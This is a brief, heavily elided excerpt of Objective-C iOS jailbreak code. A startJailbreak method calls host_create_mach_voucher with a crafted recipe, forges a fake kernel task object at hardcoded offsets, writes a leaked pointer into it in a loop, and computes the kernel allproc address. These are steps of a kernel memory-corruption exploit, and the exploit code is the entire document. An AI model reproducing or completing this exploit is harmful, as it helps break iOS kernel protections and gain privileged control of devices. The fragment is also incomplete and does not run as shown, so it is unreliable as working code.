...
- (void)startJailbreak {
    ...
    kern_return_t lol = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)data, sizeof(mach_voucher_attr_recipe_data_t), &vch);
...
gotclock:;
    ...
    *(uint64_t*) (faketask + 0x10) = 0xee;
    ...
    while (1) {
        int32_t leaked = 0;
        *(uint64_t*) (faketask + get_procoff()) = leaked_ptr - 0x10;
    ...
    uint64_t allproc = get_allproc_offset() + kernel_base;
